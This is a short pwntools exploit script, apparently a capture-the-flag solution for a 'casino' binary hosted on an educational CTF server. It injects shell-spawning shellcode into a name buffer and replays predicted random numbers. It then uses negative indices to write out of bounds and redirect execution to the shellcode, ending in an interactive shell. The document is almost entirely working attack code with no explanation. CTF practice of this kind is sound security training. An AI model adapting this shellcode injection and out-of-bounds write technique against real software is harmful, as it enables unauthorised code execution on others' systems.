#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
y = remote( 'localhost' , 10172 )
#y = remote( 'edu-ctf.csie.org' , 10172 )
#y = process( '../casino/share/casino' )

rnd = [83,86,77,15,93,35]

name = 0x6020f0
y.sendafter( ':' , '\0' * 0x20 + asm( shellcraft.sh() ) )
y.sendafter( ':' , '27' )

for i in range( 6 ):
    y.sendafter( ':' , '7\n' )
y.sendafter( ']: ' , '1\n' )
y.sendafter( ': ' , '-42\n' )
y.sendafter( ': ' , '0\n' )

for i in rnd:
    y.sendafter( ':' , str(i) + '\n' )

y.sendafter( ']: ' , '1\n' )
y.sendafter( ': ' , '-43' )
y.sendafter( ': ' , str( name + 0x20 ) )


y.interactive()


'''
0: 83
1: 86
2: 77
3: 15
4: 93
5: 35

6: 86
7: 92
8: 49
9: 21
10: 62
11: 27

12: 90
13: 59
14: 63
15: 26
16: 40
17: 26
18: 72
19: 36
'''
